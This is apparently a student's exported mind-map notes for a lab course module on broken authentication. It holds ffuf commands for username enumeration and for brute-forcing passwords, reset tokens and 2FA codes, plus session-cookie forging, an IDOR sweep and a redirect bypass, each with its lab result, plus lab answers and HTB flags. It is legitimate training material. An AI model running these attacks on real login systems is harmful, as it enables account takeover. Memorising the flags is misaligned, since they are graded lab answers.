---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Broken Authentication"
output_topics: 40
---

# Broken Authentication — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> * FUZZ: consuelo
>
> **Source path:** Broken Authentication → authentication method → exploit this difference in error messages → ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&amp;password=invalid" -fr "Unknown user" → * FUZZ: consuelo
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8903d819-1c66-45d2-a787-d1d2c37cd718 -->

> [!output]+ 🟨 Output 002
> cookster
>
> **Source path:** Broken Authentication → authentication method → LAB → Enumerate a valid user on the web application. Provide the username as the answer. → use Intruder on the Login POST request → use xato-net-10-million-usernames.txt as the username wordlist  with wrong vlaue password → got 1 diffrent response saying Invalid Credentials → cookster
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f244637c-80e2-4918-86d0-cce103ca3b18 -->

> [!output]+ 🟨 Output 003
> 151647 custom_wordlist.txt
>
> **Source path:** Broken Authentication → Brute-Forcing Passwords → use grep to match only those passwords that match the password policy implemented in rockyou.txt → grep → grep '\[\[:upper:\]\]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '\[\[:lower:\]\]' | grep '\[\[:digit:\]\]' | grep -E '.{10}' &gt; custom_wordlist.txt → wc -l custom_wordlist.txt → 151647 custom_wordlist.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2b1bbefc-165c-4db2-890e-47c4dfc776b5 -->

> [!output]+ 🟨 Output 004
> * FUZZ: Buttercup1
>
> **Source path:** Broken Authentication → Brute-Forcing Passwords → build our ffuf command to brute-force the user's password → ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&amp;password=FUZZ" -fr "Invalid username" → * FUZZ: Buttercup1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f73758e0-af32-4a3d-a4df-1d04273f5d7d -->

> [!output]+ 🟨 Output 005
> Ramirez120992
>
> **Source path:** Broken Authentication → Brute-Forcing Passwords → LAB → What is the password of the user 'admin'? → tar -tvf rockyou.txt.tar.gz → sudo awk 'length($0) &gt;= 10 &amp;&amp; /[a-z]/ &amp;&amp; /[A-Z]/ &amp;&amp; /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt &gt; custom_wordlist.txt → sudo ffuf -X POST -d 'username=admin&amp;password=FUZZ' -u 'http://83.136.248.107:50034/index.php' -w custom_wordlist.txt -fr "Invalid username or password" -H "Content-Type: application/x-www-form-urlencoded" → Ramirez120992
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 922bbb3c-3ce7-45e7-84c6-29d9f608e7e0 -->

> [!output]+ 🟨 Output 006
> * FUZZ: 6182
>
> **Source path:** Broken Authentication → Brute-Forcing Password Reset Tokens → Attacking Weak Reset Tokens → ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid" → * FUZZ: 6182
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b77bdfb5-e147-47f5-a143-4bb6ea634dbc -->

> [!output]+ 🟨 Output 007
> visit /reset_password.php
>
> **Source path:** Broken Authentication → Brute-Forcing Password Reset Tokens → LAB → visit rest your passwrd → user: admin → visit /reset_password.php
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1d4b36e3-4d8b-49c0-a271-3ebff3b3934d -->

> [!output]+ 🟨 Output 008
> After visit we got an error "the provided token is invalid"
>
> **Source path:** Broken Authentication → Brute-Forcing Password Reset Tokens → LAB → visit rest your passwrd → user: admin → visit /reset_password.php → After visit we got an error "the provided token is invalid"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e6a7a666-c04a-42c0-9683-2bfae933d856 -->

> [!output]+ 🟨 Output 009
> 4891
>
> **Source path:** Broken Authentication → Brute-Forcing Password Reset Tokens → LAB → FUZZ → ffuf -w ./tokens.txt -u http://83.136.252.32:32779/reset_password.php?token=FUZZ -fr "The provided token is invalid" → 4891
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f5486c3e-aaec-4170-a80f-dcce4bff363e -->

> [!output]+ 🟨 Output 010
> Hello admin please rest your password
>
> **Source path:** Broken Authentication → Brute-Forcing Password Reset Tokens → LAB → Reset → curl http://83.136.252.32:32779/reset_password.php?token=4891 --proxy 127.0.0.1:8080 → Hello admin please rest your password
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 458085c4-f532-4fe0-ae58-b070f9e87cd6 -->

> [!output]+ 🟨 Output 011
> HTB{36da098385e641d54e1b2750721d816e}
>
> **Source path:** Broken Authentication → Brute-Forcing Password Reset Tokens → LAB → Reset → curl http://83.136.252.32:32779/reset_password.php?token=4891 --proxy 127.0.0.1:8080 → Hello admin please rest your password → 123456 → login as admin:123456 → HTB{36da098385e641d54e1b2750721d816e}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7dbba35e-abe6-457a-b05e-f17b0dfb528a -->

> [!output]+ 🟨 Output 012
> * FUZZ: 6513
>
> **Source path:** Broken Authentication → Brute-Forcing 2FA Codes → specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session. → brute-force the correct TOTP by filtering out responses containing the Invalid 2FA Code → ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code" → * FUZZ: 6513
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e9a91e65-0d47-46e8-ab6b-b583eef16ddd -->

> [!output]+ 🟨 Output 013
> * FUZZ: 6514
>
> **Source path:** Broken Authentication → Brute-Forcing 2FA Codes → specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session. → brute-force the correct TOTP by filtering out responses containing the Invalid 2FA Code → ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code" → * FUZZ: 6514
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e7c9a7ea-5b3b-472b-9dc0-c1e5e0457145 -->

> [!output]+ 🟨 Output 014
> * FUZZ: 9999
>
> **Source path:** Broken Authentication → Brute-Forcing 2FA Codes → specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session. → brute-force the correct TOTP by filtering out responses containing the Invalid 2FA Code → ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code" → * FUZZ: 9999
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 207078af-c29c-405e-9ea7-54870766e5b3 -->

> [!output]+ 🟨 Output 015
> 4723
>
> **Source path:** Broken Authentication → Brute-Forcing 2FA Codes → specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session. → LAB → Login with correct credentials → admin:admin → ffuf -X POST -b 'PHPSESSID=3bsa0u3t0s8907svf7no09n2la' -d 'otp=FUZZ' -u 'http://94.237.123.236:56830/2fa.php' -H 'Content-Type: application/x-www-form-urlencoded' -w tokens.txt -fs 732 → 4723
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e1eacee2-86f3-4e1c-9c58-3be21c484ffb -->

> [!output]+ 🟨 Output 016
> 4723
>
> **Source path:** Broken Authentication → Brute-Forcing 2FA Codes → specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session. → LAB → Login with correct credentials → admin:admin → ffuf -X POST -b 'PHPSESSID=3bsa0u3t0s8907svf7no09n2la' -d 'otp=FUZZ' -u 'http://94.237.123.236:56830/2fa.php' -H 'Content-Type: application/x-www-form-urlencoded' -w tokens.txt -fs 732 → 4723
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 260a5ed0-0c35-4a8e-a323-f208e65b5a05 -->

> [!output]+ 🟨 Output 017
> HTB{9837b33a1ef678c380addf7ef8a517de}
>
> **Source path:** Broken Authentication → Brute-Forcing 2FA Codes → specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session. → LAB → visit /admin.php → HTB{9837b33a1ef678c380addf7ef8a517de}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0190701d-79fa-40fa-8e80-c2caa33599ae -->

> [!output]+ 🟨 Output 018
> * FUZZ: Houston
>
> **Source path:** Broken Authentication → Vulnerable Password Reset → Guessable Password Reset Questions → "What is your mother's maiden name?"  "What city were you born in?" → can often be obtained through OSINT or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection. → There are multiple lists containing large cities worldwide. → https://github.com/datasets/world-cities/blob/master/data/world-cities.csv → can create our wordlist containing only the city name → cat world-cities.csv | cut -d ',' -f1 &gt; city_wordlist.txt → * FUZZ: Houston
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c89bd429-48fb-4df2-850e-275c4cc971e6 -->

> [!output]+ 🟨 Output 019
> Which City were you born in?
>
> **Source path:** Broken Authentication → Vulnerable Password Reset → Manipulating the Reset Request → manipulate a potentially hidden parameter to reset the password of a different account. → Which City were you born in?
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9fb0d805-da67-4bc3-be10-325be1897a99 -->

> [!output]+ 🟨 Output 020
> Manchester
>
> **Source path:** Broken Authentication → Vulnerable Password Reset → LAB → Which city is the admin user from? → ffuf -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded'     -b $'PHPSESSID=cqcfdbu93ekmo9d3908q8tgc16'     --data-binary $'security_response=FUZZ'  -w world-cities.txt   -u 'http://94.237.120.119:44206/security_question.php' -fr 'Incorrect' → Manchester
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a184d166-ec1d-4a29-b3ee-5827526ac952 -->

> [!output]+ 🟨 Output 021
> HTB{d4740b1801d9880ff70de227a54309f0}
>
> **Source path:** Broken Authentication → Vulnerable Password Reset → LAB → Reset the admin user's password on the target system to obtain the flag. → HTB{d4740b1801d9880ff70de227a54309f0}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f32f1a6a-967b-4239-bffb-07cf99c910e4 -->

> [!output]+ 🟨 Output 022
> HTB{913ab2d84b8db21854c696dee1f1db68}
>
> **Source path:** Broken Authentication → Authentication Bypass via Direct Access → LAB → visit /admin.php → we got 302 and html page alongside it → do intercept the response → change 302 into 200 → HTB{913ab2d84b8db21854c696dee1f1db68}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 341082b2-167b-4807-9e1c-2e72da5aecaf -->

> [!output]+ 🟨 Output 023
> 372
>
> **Source path:** Broken Authentication → Authentication Bypass via Parameter Modification → LAB → Apply what you learned in this section to bypass authentication to obtain the flag. → seq 1 9999 &gt; idor.txt → ffuf -u http://94.237.122.95:59454/admin.php?user_id=FUZZ -w idor.txt  -fr 'Could not load admin data' → 372
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d5ea516b-a670-4cfa-90e6-7c49a5e5393c -->

> [!output]+ 🟨 Output 024
> HTB{63593317426484ea6d270c2159335780}
>
> **Source path:** Broken Authentication → Authentication Bypass via Parameter Modification → LAB → Apply what you learned in this section to bypass authentication to obtain the flag. → seq 1 9999 &gt; idor.txt → ffuf -u http://94.237.122.95:59454/admin.php?user_id=FUZZ -w idor.txt  -fr 'Could not load admin data' → 372 → http://94.237.122.95:59454/admin.php?user_id=372 → HTB{63593317426484ea6d270c2159335780}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2e7ef483-2f94-48e9-b427-c8ba06bbc6a3 -->

> [!output]+ 🟨 Output 025
> user=htb-stdnt;role=user
>
> **Source path:** Broken Authentication → Attacking Session Tokens → Attacking Predictable Session Tokens → While this session token might seem random at first, a simple analysis reveals that it is base64-encoded data: → echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d → user=htb-stdnt;role=user
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5e5193ea-41eb-458a-9cc2-a59be11aa406 -->

> [!output]+ 🟨 Output 026
> dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
>
> **Source path:** Broken Authentication → Attacking Session Tokens → Attacking Predictable Session Tokens → tampering with the data → echo -n 'user=htb-stdnt;role=admin' | base64 → dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8434bcd0-80a2-4bd0-8725-5ad4558f2678 -->

> [!output]+ 🟨 Output 027
> Set-Cookie: session=757365723d6874622d7374646e743b726f6c653d75736572
>
> **Source path:** Broken Authentication → Attacking Session Tokens → LAB → Obtain administrative access on the target to obtain the flag. → login as htb-stdnt:AcademyStudent! → Set-Cookie: session=757365723d6874622d7374646e743b726f6c653d75736572
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 84431905-7652-4beb-bff4-bb36860eb2db -->

> [!output]+ 🟨 Output 028
> user=htb-stdnt;role=user
>
> **Source path:** Broken Authentication → Attacking Session Tokens → LAB → Obtain administrative access on the target to obtain the flag. → login as htb-stdnt:AcademyStudent! → Set-Cookie: session=757365723d6874622d7374646e743b726f6c653d75736572 → decode hexadecimal → echo 757365723d6874622d7374646e743b726f6c653d75736572 | xxd -r -p → user=htb-stdnt;role=user
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d3b1a380-dcf5-4b20-a4f7-cb6e65bea105 -->

> [!output]+ 🟨 Output 029
> 757365723d6874622d7374646e743b726f6c653d61646d696e
>
> **Source path:** Broken Authentication → Attacking Session Tokens → LAB → Obtain administrative access on the target to obtain the flag. → forge the session → echo -n 'user=htb-stdnt;role=admin' | xxd -p → 757365723d6874622d7374646e743b726f6c653d61646d696e
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b2fb7333-da2e-4f20-8587-5acbdc1e525e -->

> [!output]+ 🟨 Output 030
> HTB{d1f5d760d130f7dd11de93f0b393abda}
>
> **Source path:** Broken Authentication → Attacking Session Tokens → LAB → Obtain administrative access on the target to obtain the flag. → forge the session → echo -n 'user=htb-stdnt;role=admin' | xxd -p → 757365723d6874622d7374646e743b726f6c653d61646d696e → in Burp Repeater → Cookie: session=757365723d6874622d7374646e743b726f6c653d61646d696e → open in browser → HTB{d1f5d760d130f7dd11de93f0b393abda}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 934cd117-7fd3-419d-8cb6-989a7c608caf -->

> [!output]+ 🟨 Output 031
> welcome u!
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Get a credential for user → inspect the response for login attempts → success credntials → welcome u!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f1b071ca-65fc-4930-ba0c-16e451af6859 -->

> [!output]+ 🟨 Output 032
> Invalid credentials.
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Get a credential for user → inspect the response for login attempts → wrong password → Invalid credentials.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 736d664f-4087-4def-9d4b-57a2e5fa8826 -->

> [!output]+ 🟨 Output 033
> Unknown username or password.
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Get a credential for user → inspect the response for login attempts → wrong username → Unknown username or password.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a93926cd-7291-4bb4-bbd6-c07bef51fd7b -->

> [!output]+ 🟨 Output 034
> gladys
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Get a credential for user → username enumeration → ffuf -X POST -u http://94.237.56.175:43525/login.php -d 'username=FUZZ&amp;password=Aa1234123412' -H "Content-Type: application/x-www-form-urlencoded" -fr 'Unknown username or password.' -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt → gladys
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cae77574-2038-4e98-ab94-64c3ae2cefd6 -->

> [!output]+ 🟨 Output 035
> dWinaldasD13
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Get a credential for user → brute force gladys password → ffuf -X POST -u http://94.237.56.175:43525/login.php -d 'username=gladys&amp;password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded" -fr 'Invalid credentials.' -w passwords.txt → dWinaldasD13
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a4dc77c2-5c4d-4510-ad5c-7d75e2bdfc6f -->

> [!output]+ 🟨 Output 036
> Invalid OTP.
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Please provide your 2FA OTP → 1111 → Invalid OTP.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 02c3ebb5-85c0-4b08-a609-0d2b15fa2065 -->

> [!output]+ 🟨 Output 037
> HTTP/1.1 302 Found
> Location: /2fa.php
>
> &lt;HTML&gt;
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Try Manipulate the HTTP request → GET /profile.php → HTTP/1.1 302 Found Location: /2fa.php  &lt;HTML&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e0e4f921-3f98-4f5e-89f3-7bdd49609e5b -->

> [!output]+ 🟨 Output 038
> You do not have admin privileges. The site is still under construction
> and only available to admins at this time.
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Try Manipulate the HTTP request → GET /profile.php → HTTP/1.1 302 Found Location: /2fa.php  &lt;HTML&gt; → Render → You do not have admin privileges. The site is still under construction and only available to admins at this time.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: aa71c9ed-f5b3-4460-8030-da491909afda -->

> [!output]+ 🟨 Output 039
> config.php
> db.php
> index.php
> login.php
> logout.php
> profile.php
> register.php
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Fuzz → ffuf -u http://154.57.164.69:31698/FUZZ -w /usr/share/wordlists/dirb/big.txt  -e .php → config.php db.php index.php login.php logout.php profile.php register.php
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 33221f9a-26b7-4bfd-87e8-59289173d441 -->

> [!output]+ 🟨 Output 040
> Welcome gladys!
>
> HTB{d86115e037388d0fa29280b737fd9171}
>
> **Source path:** Broken Authentication → Skills Assessment → Combine the attacks you have learned in this module to obtain the flag. → Try Direct Access → Match and Replace → Response Header → Match /2fa.php → Replace /profile.php → Welcome gladys!  HTB{d86115e037388d0fa29280b737fd9171}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c19e3989-2ccd-404c-810f-79576270aaa6 -->
